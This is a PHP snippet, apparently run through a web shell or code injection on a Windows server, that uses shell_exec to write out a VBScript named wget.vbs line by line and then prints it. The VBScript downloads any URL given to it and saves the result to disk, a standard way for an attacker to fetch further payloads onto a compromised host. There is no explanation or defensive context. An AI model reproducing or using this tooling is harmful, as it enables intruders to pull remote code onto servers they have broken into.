shell_exec('echo strUrl = WScript.Arguments.Item(0) > wget.vbs');
shell_exec('echo StrFile = WScript.Arguments.Item(1) >> wget.vbs');
shell_exec('echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs');
shell_exec('echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs');
shell_exec('echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs');
shell_exec('echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs');
shell_exec('echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs');
shell_exec('echo Err.Clear >> wget.vbs');
shell_exec('echo Set http = Nothing >> wget.vbs');
shell_exec('echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs');
shell_exec('echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs');
shell_exec('echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs');
shell_exec('echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs');
shell_exec('echo http.Open "GET",strURL,False >> wget.vbs');
shell_exec('echo http.Send >> wget.vbs');
shell_exec('echo varByteArray = http.ResponseBody >> wget.vbs');
shell_exec('echo Set http = Nothing >> wget.vbs');
shell_exec('echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs');
shell_exec('echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs');
shell_exec('echo strData = "" >> wget.vbs');
shell_exec('echo strBuffer = "" >> wget.vbs');
shell_exec('echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs');
shell_exec('echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs');
shell_exec('echo Next >> wget.vbs');
shell_exec('echo ts.Close >> wget.vbs');
$output = shell_exec("type wget.vbs");
echo "<pre>$output</pre>";
